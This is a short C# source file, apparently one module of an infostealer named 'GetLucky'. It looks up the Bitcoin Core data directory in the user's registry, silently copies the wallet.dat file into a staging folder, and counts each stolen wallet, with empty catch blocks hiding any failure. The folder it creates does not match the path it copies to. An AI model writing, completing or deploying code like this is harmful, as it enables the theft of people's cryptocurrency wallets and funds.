﻿using Microsoft.Win32;
using System.IO;

namespace GetLucky
{
    class BitcoinCore
    {
        public static int count = 0;
        public static void BCStr(string directorypath)
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
                        count++;
                        Wallets.count++;
                    }
                    catch {}
            }
            catch {}

        }
    }
}
